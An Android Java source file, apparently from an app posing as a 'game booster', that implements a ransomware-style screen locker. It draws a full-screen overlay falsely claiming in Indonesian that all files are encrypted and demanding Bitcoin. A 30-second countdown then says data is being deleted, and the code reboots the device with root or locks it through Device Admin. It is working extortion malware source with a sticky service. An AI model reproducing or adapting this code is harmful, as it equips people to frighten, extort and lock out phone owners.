package com.example.gamebooster;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.CountDownTimer;
import android.os.IBinder;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;

public class RansomService extends Service {

    private WindowManager windowManager;
    private View overlayView;
    private TextView timerText;

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        showOverlay();
    }

    private void showOverlay() {
        int layoutFlag;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            layoutFlag = WindowManager.LayoutParams.TYPE_PHONE;
        }

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                layoutFlag,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT);

        // Bikin Layout Programmatically (Gak butuh XML)
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.BLACK);
        layout.setGravity(Gravity.CENTER);

        TextView titleText = new TextView(this);
        titleText.setText("⚠️ SYSTEM ENCRYPTED ⚠️");
        titleText.setTextColor(Color.RED);
        titleText.setTextSize(30);
        titleText.setGravity(Gravity.CENTER);
        layout.addView(titleText);

        TextView descText = new TextView(this);
        descText.setText("\nSemua file Anda telah dienkripsi.\nKirim Bitcoin untuk membuka kunci.");
        descText.setTextColor(Color.WHITE);
        descText.setTextSize(18);
        descText.setGravity(Gravity.CENTER);
        layout.addView(descText);

        timerText = new TextView(this);
        timerText.setText("\n\nSISA WAKTU: 30 DETIK");
        timerText.setTextColor(Color.YELLOW);
        timerText.setTextSize(24);
        timerText.setGravity(Gravity.CENTER);
        layout.addView(timerText);

        overlayView = layout;
        windowManager.addView(overlayView, params);
        startCountdown();
    }

    private void startCountdown() {
        new CountDownTimer(30000, 1000) {
            @Override
            public void onTick(long millisUntilFinished) {
                timerText.setText("\n\nSISA WAKTU: " + millisUntilFinished / 1000 + " DETIK");
            }

            @Override
            public void onFinish() {
                timerText.setText("\n\nMENGHAPUS DATA...");
                rebootDevice();
            }
        }.start();
    }

    private void rebootDevice() {
        try {
            // Coba restart pakai akses Root
            Process proc = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
            proc.waitFor();
        } catch (Exception e) {
            // Kalau gak ada root, pakai Device Admin buat Lock HP
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, AdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                dpm.lockNow(); // Ngunci HP kalau gak bisa restart
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
